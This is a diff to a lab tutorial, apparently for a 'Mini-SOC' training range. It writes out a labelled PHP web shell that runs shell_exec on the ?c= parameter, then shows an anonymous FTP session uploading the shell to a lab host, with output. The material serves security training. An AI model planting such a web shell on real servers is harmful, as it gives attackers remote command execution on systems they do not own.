@@ -55,50 +55,44 @@ restarts `vsftpd`.
 Everything from here on is typed directly into a `kali` shell
 (`vagrant ssh kali`) – no wrapper script runs this for you.
 
-**2a. Write a small, clearly-labelled web shell:**
+**2a. Write a small, clearly-labelled web shell.** Open a text editor
+(`nano /tmp/shell.php` or whatever you've got) and save this:
 
-```bash
-cat > /tmp/shell.php <<'PHP'
+```php
 <?php
 // Mini-SOC training artifact (exercises/01-ftp-webshell) - NOT disguised,
 // NOT persistent beyond this exercise. Runs one shell command from ?c=.
 echo "<pre>Mini-SOC exercise 01 web shell\n";
 echo shell_exec($_GET['c'] ?? 'id');
 echo "</pre>";
-PHP
 ```
 
 One line of real functionality (`shell_exec` on whatever `?c=` says) –
 everything else is just making it obvious this is a training payload, not
 something to actually hide.
 
-**2b. Log in to the anonymous FTP and upload it** – an interactive FTP
-session, typed as you'd type it by hand:
-
-```bash
-ftp -inv 10.10.20.10 <<'FTP'
-user anonymous anonymous@example.com
-cd uploads
-binary
-put /tmp/shell.php shell.php
-bye
-FTP
-```
+**2b. Log in to the anonymous FTP and upload it** – an interactive
+session, typed one command at a time:
 
 ```
+$ ftp 10.10.20.10
 Connected to 10.10.20.10.
 220 (vsFTPd 3.0.5)
+Name (10.10.20.10:vagrant): anonymous
 331 Please specify the password.
+Password: [anything - anonymous FTP ignores it]
 230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
+ftp> cd uploads
 250 Directory successfully changed.
+ftp> binary
 200 Switching to Binary mode.
+ftp> put /tmp/shell.php shell.php
 local: /tmp/shell.php remote: shell.php
 229 Entering Extended Passive Mode (|||34450|)
 150 Ok to send data.
 226 Transfer complete.
 252 bytes sent in 00:00 (199.10 KiB/s)
+ftp> bye
 221 Goodbye.
 ```
 
